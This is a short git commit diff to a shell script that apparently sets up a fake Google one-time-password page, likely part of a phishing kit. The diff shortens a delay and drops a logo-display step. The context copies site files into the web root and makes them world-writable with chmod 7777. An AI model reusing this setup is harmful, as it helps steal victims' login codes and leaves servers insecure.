c9315e5909670a2da403fe4c5cd620e5606282d4
SG_PRO <55870659+Ignitetch@users.noreply.github.com>
2020-03-16 05:21:55 -0400

    Update Google-otp.sh

--- sites/google-otp/Google-otp.sh
+++ sites/google-otp/Google-otp.sh
@@ -13,7 +13,7 @@ fi
 
 } 
 
-sleep 6
+sleep 2
 # spinner
 spinlong ()
 {
@@ -66,8 +66,6 @@ echo ""
 		cp -R * /var/www/html/
 		cd ..
                 clear
-                chmod 777 Logo.sh
-                ./Logo.sh
 		cd /var/www/html/
                 chmod +x *
 		chmod 7777 *
